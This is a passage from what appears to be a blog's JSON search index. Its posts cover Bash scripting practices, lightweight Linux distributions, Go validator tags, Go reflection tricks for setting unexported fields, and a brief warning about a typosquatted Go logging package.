id=\"minimize-subshells\"\u003eMinimize Subshells\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eSubshells can be expensive in terms of performance.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eoutput\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecat file.txt\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eoutput\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003e\u0026lt;file.txt\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"use-arrays-for-bulk-data\"\u003eUse Arrays for Bulk Data\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eWhen handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem1\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apple\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem2\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;banana\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitem3\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cherry\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eitems\u003cspan style=\"color:#f92672\"\u003e=(\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;apple\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;banana\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cherry\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e item in \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eitems[@]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$item\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"enable-noclobber\"\u003eEnable Noclobber\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eTo prevent accidental overwriting of files.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o noclobber\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"use-functions\"\u003eUse Functions\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eFunctions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 id=\"efficient-file-operations\"\u003eEfficient File Operations\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eWhen performing file operations, use efficient techniques to minimize resource usage.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e read -r line; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$line\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \u0026lt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e IFS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e read -r line; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$line\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e \u0026lt; file.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"parallel-processing\"\u003eParallel Processing\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eTools like \u003ccode\u003exargs\u003c/code\u003e and GNU \u003ccode\u003eparallel\u003c/code\u003e can be incredibly useful.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 id=\"error-handling\"\u003eError Handling\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eRobust error handling is critical for creating reliable and maintainable scripts.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Custom Error Messages: Implement custom error messages to provide more context when something goes wrong.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecommand1 \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;command1 failed\u0026#34;\u003c/span\u003e; exit 1; \u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etrap \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39;\u003c/span\u003e ERR\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunction\u003c/span\u003e cleanup\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e# Cleanup code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e -z \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e$0\u003cspan style=\"color:#e6db74\"\u003e \u0026lt;argument\u0026gt;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Logging: Implement logging to keep track of script execution and diagnose issues.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003elogfile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;script.log\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec \u0026gt; \u0026gt;\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003etee -i $logfile\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexec 2\u0026gt;\u0026amp;\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Script started\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"automating-complex-system-administration-tasks\"\u003eAutomating Complex System Administration Tasks:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eAutomated Backups\u003c/li\u003e\n\u003cli\u003eSystem Monitoring\u003c/li\u003e\n\u003cli\u003eUser Management\u003c/li\u003e\n\u003cli\u003eAutomated Updates\u003c/li\u003e\n\u003cli\u003eNetwork Configuration\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","SHELL","BASH"],"title":"Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash"},{"categories":["Google","URL","infra","infrastructure","network","switch"],"contents":" Google 的十年五代网络架构 ","date":"September 24, 2024","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240924-google-infra/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.kawabangga.com/posts/6624\" target=\"_blank\" rel=\"noopener\"\u003eGoogle 的十年五代网络架构\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["Google","URL","infra","infrastructure","network","switch"],"title":"Google Infra"},{"categories":["golang","URL","security"],"contents":" 提高警惕，供应链攻击就在你我身边 github.com/siruspen/logrus 假 github.com/sirupsen/logrus 真 ","date":"September 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240913-golang/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://v2ex.com/t/1072079\" target=\"_blank\" rel=\"noopener\"\u003e提高警惕，供应链攻击就在你我身边\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003egithub.com/siruspen/logrus\u003c/code\u003e 假\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egithub.com/sirupsen/logrus\u003c/code\u003e 真\u003c/li\u003e\n\u003c/ul\u003e","tags":["golang","URL","security"],"title":"Supply chain attack"},{"categories":["Linux","URL","lightweight"],"contents":" lightweight-linux-distributions-for-your-pc Name Site Comment Puppy Linux https://puppylinux-woof-ce.github.io/ This tiny OS weighs in at under 300MB, so it can run smoothly even on systems with as little as 512MB of RAM. Bodhi Linux https://www.bodhilinux.com/ System requirements are just 512MB of RAM and a 500MHz processor. Peppermint OS https://peppermintos.com/ It only needs 512MB of RAM to run, so it will fly on that Pentium 4 machine or Core 2 Duo laptop you have stashed in your closet. While Peppermint OS is light on local resources, it integrates well with cloud and web apps. The OS builds in close integration with services like Dropbox, Google Drive, and more. AntiX https://antixlinux.com/ AntiX is designed to run on systems with as little as 64MB of RAM and a Pentium II processor. Lubuntu https://lubuntu.me/ Lubuntu will run smoothly on computers with as little as 512 MB of RAM and a 1 GHz processor. ","date":"August 20, 2024","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2024/20240820-linux/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.freecodecamp.org/news/lightweight-linux-distributions-for-your-pc/\" target=\"_blank\" rel=\"noopener\"\u003elightweight-linux-distributions-for-your-pc\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eName\u003c/th\u003e\n          \u003cth\u003eSite\u003c/th\u003e\n          \u003cth\u003eComment\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePuppy Linux\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://puppylinux-woof-ce.github.io/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://puppylinux-woof-ce.github.io/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eThis tiny OS weighs in at under 300MB, so it can run smoothly even on systems with as little as 512MB of RAM.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eBodhi Linux\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://www.bodhilinux.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://www.bodhilinux.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eSystem requirements are just 512MB of RAM and a 500MHz processor.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePeppermint OS\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://peppermintos.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://peppermintos.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eIt only needs 512MB of RAM to run, so it will fly on that Pentium 4 machine or Core 2 Duo laptop you have stashed in your closet. While Peppermint OS is light on local resources, it integrates well with cloud and web apps. The OS builds in close integration with services like Dropbox, Google Drive, and more.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eAntiX\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://antixlinux.com/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://antixlinux.com/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eAntiX is designed to run on systems with as little as 64MB of RAM and a Pentium II processor.\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eLubuntu\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://lubuntu.me/\" target=\"_blank\" rel=\"noopener\"\u003ehttps://lubuntu.me/\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003eLubuntu will run smoothly on computers with as little as 512 MB of RAM and a 1 GHz processor.\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["Linux","URL","lightweight"],"title":"Lightweight Linux Distributions For Older PCs"},{"categories":["golang","URL","GIN","byte","string"],"contents":" 学会 gin 参数校验之 validator 库，看这一篇就足够了 字符串约束 excludesall：不包含参数中任意的 UNICODE 字符，例如 excludesall=ab\nexcludesrune：不包含参数表示的 rune 字符，excludesrune=asong\nstartswith：以参数子串为前缀，例如 startswith=hi\nendswith：以参数子串为后缀，例如 endswith=bye。\ncontains=：包含参数子串，例如 contains=email\ncontainsany：包含参数中任意的 UNICODE 字符，例如 containsany=ab\ncontainsrune：包含参数表示的 rune 字符，例如`containsrune=asong\nexcludes：不包含参数子串，例如 excludes=email\n范围约束 范围约束的字段类型分为三种：\n对于数值，我们则可以约束其值 对于切片、数组和 map，我们则可以约束其长度 对于字符串，我们则可以约束其长度\n常用 tag 介绍： ne：不等于参数值，例如 ne=5 gt：大于参数值，例如 gt=5 gte：大于等于参数值，例如 gte=50 lt：小于参数值，例如 lt=50 lte：小于等于参数值，例如 lte=50 oneof：只能是列举出的值其中一个，这些值必须是数值或字符串，以空格分隔，如果字符串中有空格，将字符串用单引号包围，例如 oneof=male female。 eq：等于参数值，注意与 len 不同。对于字符串，eq 约束字符串本身的值，而 len 约束字符串长度。例如 eq=10 len：等于参数值，例如 len=10 max：小于等于参数值，例如 max=10 min：大于等于参数值，例如 min=10\nFields 约束 eqfield：定义字段间的相等约束，用于约束同一结构体中的字段。例如：eqfield=Password eqcsfield：约束统一结构体中字段等于另一个字段（相对），确认密码时可以使用，例如：eqfiel=ConfirmPassword nefield：用来约束两个字段是否相同，确认两种颜色是否一致时可以使用，例如：nefield=Color1 necsfield：约束两个字段是否相同（相对）\n常用约束 unique：指定唯一性约束，不同类型处理不同：\n对于 map，unique 约束没有重复的值 对于数组和切片，unique 没有重复的值 对于元素类型为结构体的碎片，unique 约束结构体对象的某个字段不重复，使用 unique=field 指定字段名\nemail：使用 email 来限制字段必须是邮件形式，直接写 eamil 即可，无需加任何指定。\nomitempty：字段未设置，则忽略\n-：跳过该字段，不检验\n|：使用多个约束，只需要满足其中一个，例如 rgb|rgba\nrequired：字段必须设置，不能为默认值\ntype Info struct { CreateTime time.Time `form:\u0026#34;create_time\u0026#34; binding:\u0026#34;required,timing\u0026#34; time_format:\u0026#34;2006-01-02\u0026#34;` UpdateTime time.Time `form:\u0026#34;update_time\u0026#34; binding:\u0026#34;required,timing\u0026#34; time_format:\u0026#34;2006-01-02\u0026#34;` } 没有什么不可能：修改 Go 结构体的私有字段 在我们的 main 函数中，你不能访问 Person 的 age 字段： package main; import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; \u0026#34;unsafe\u0026#34; \u0026#34;github.com/smallnest/private/model\u0026#34; ) func main() { p := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) fmt.Printf(\u0026#34;Person: %+v\\n\u0026#34;, p) // fmt.Println(p.age) // error: p.age undefined (cannot refer to unexported field or method age) t := model.NewTeacher(\u0026#34;smallnest\u0026#34;, 18) fmt.Printf(\u0026#34;Teacher: %+v\\n\u0026#34;, t) // Teacher: {Name:Alice Age:30} } 那么真的就无法访问了吗？也不一定，我们可以通过反射的方式访问私有字段：\np := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) age := reflect.ValueOf(p).FieldByName(\u0026#34;age\u0026#34;) fmt.Printf(\u0026#34;原始值: %d, CanSet: %v\\n\u0026#34;, age.Int(), age.CanSet()) // 30, false 运行这个程序，可以看到我们获得了这个私有字段 age 的值：\n原始值: 30, CanSet: false 这里我们以标准库的 sync.Mutex 结构体为例，sync.Mutex 包含两个字段，这两个字段都是私有的： type Mutex struct { state int32 sema uint32 } 正常情况下你只能通过 Mutex.Lock 和 Mutex.Unlock 来间接的修改这两个字段。\n现在我们演示通过 hack 的方式修改 Mutex 的 state 字段的值：\nfunc setPrivateField() { var mu sync.Mutex mu.Lock() field := reflect.ValueOf(\u0026amp;mu).Elem().FieldByName(\u0026#34;state\u0026#34;) state := field.Interface().(*int32) fmt.Println(*state) // ❶ flagField := reflect.ValueOf(\u0026amp;field).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) // 修改 flag 字段的值 *flagPtr \u0026amp;= ^uintptr(flagRO) // ❷ field.Set(reflect.ValueOf(int32(0))) mu.Lock() // ❸ fmt.Println(*state) } type flag uintptr const ( flagKindWidth = 5 // there are 27 kinds flagKindMask flag = 1\u0026lt;\u0026lt;flagKindWidth - 1 flagStickyRO flag = 1 \u0026lt;\u0026lt; 5 flagEmbedRO flag = 1 \u0026lt;\u0026lt; 6 flagIndir flag = 1 \u0026lt;\u0026lt; 7 flagAddr flag = 1 \u0026lt;\u0026lt; 8 flagMethod flag = 1 \u0026lt;\u0026lt; 9 flagMethodShift = 10 flagRO flag = flagStickyRO | flagEmbedRO ) ❶ 处我们已经介绍过了，访问私有字段的值，这里会打印出 1 ❶ 处我们清除了 flag 字段的 flagRO 标志位，这样就不会报 reflect: reflect.Value.SetInt using value obtained using unexported field 错误了 ❸ 处不会导致二次加锁带来的死锁，因为 state 字段的值已经被修改为 0 了，所以不会阻塞。最后打印结果还是 1\n这样我们就可以实现了修改私有字段的值了。\n使用 unexported 字段的 Value 设置公开字段 看 reflect.Value.Set 的源码，我们可以看到它会检查参数的值是否 unexported，如果是，就会报错，下面就是一个例子：\nfunc setUnexportedField2() { alice := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) bob := model.NewTeacher(\u0026#34;Bob\u0026#34;, 40) bobAgent := reflect.ValueOf(\u0026amp;bob).Elem().FieldByName(\u0026#34;Age\u0026#34;) aliceAge := reflect.ValueOf(\u0026amp;alice).Elem().FieldByName(\u0026#34;age\u0026#34;) bobAgent.Set(aliceAge) // ❹ } 注意 ❹ 处，我们尝试把 alice 的私有字段 age 的值赋值给 bob 的公开字段 Age，这里会报错：\npanic: reflect: reflect.Value.Set using value obtained using unexported field goroutine 1 [running]: reflect.flag.mustBeExportedSlow(0x1400012a000?) /usr/local/go/src/reflect/value.go:250 +0x70 reflect.flag.mustBeExported(...) /usr/local/go/src/reflect/value.go:241 reflect.Value.Set({0x102773a60?, 0x1400012a028?, 0x60?}, {0x102773a60?, 0x1400012a010?, 0x1027002b8?}) /usr/local/go/src/reflect/value.go:2320 +0x88 main.setUnexportedField2() /Users/smallnest/workspace/study/private/main.go:50 +0x168 main.main() /Users/smallnest/workspace/study/private/main.go:18 +0x1c exit status 2 原因 alice 的 age 值被识别为私有字段，它是不能用来赋值给公开字段的。\n有了上一节的经验，我们同样可以绕过这个检查，实现这个赋值：\nfunc setUnexportedField2() { alice := model.NewPerson(\u0026#34;Alice\u0026#34;, 30) bob := model.NewTeacher(\u0026#34;Bob\u0026#34;, 40) bobAgent := reflect.ValueOf(\u0026amp;bob).Elem().FieldByName(\u0026#34;Age\u0026#34;) aliceAge := reflect.ValueOf(\u0026amp;alice).Elem().FieldByName(\u0026#34;age\u0026#34;) // 修改 flag 字段的值 flagField := reflect.ValueOf(\u0026amp;aliceAge).Elem().FieldByName(\u0026#34;flag\u0026#34;) flagPtr := (*uintptr)(unsafe.Pointer(flagField.UnsafeAddr())) *flagPtr \u0026amp;= ^uintptr(flagRO) // ❺ bobAgent.Set(reflect.ValueOf(50)) bobAgent.Set(aliceAge) // ❻ } ❺ 处我们修改了 aliceAge 的 flag 字段，去掉了 flagRO 标志位，这样就不会报错了，❻ 处我们成功的把 alice 的私有字段 age 的值赋值给 bob 的公开字段 Age。\n这样我们就可以实现了使用私有字段的值给其他 Value 值进行赋值了。\n给 unaddressable 的值设置值 回到最初的问题，我们尝试给一个 unaddressable 的值设置值，会报错。\n结合上面的 hack 手段，我们也可以绕过限制，给 unaddressable 的值设置值：\nfunc setUnaddressableValue() { var x = 47 v := reflect.ValueOf(x) fmt.Printf(\u0026#34;原始值: %d, CanSet: %v\\n\u0026#34;, v.Int(), 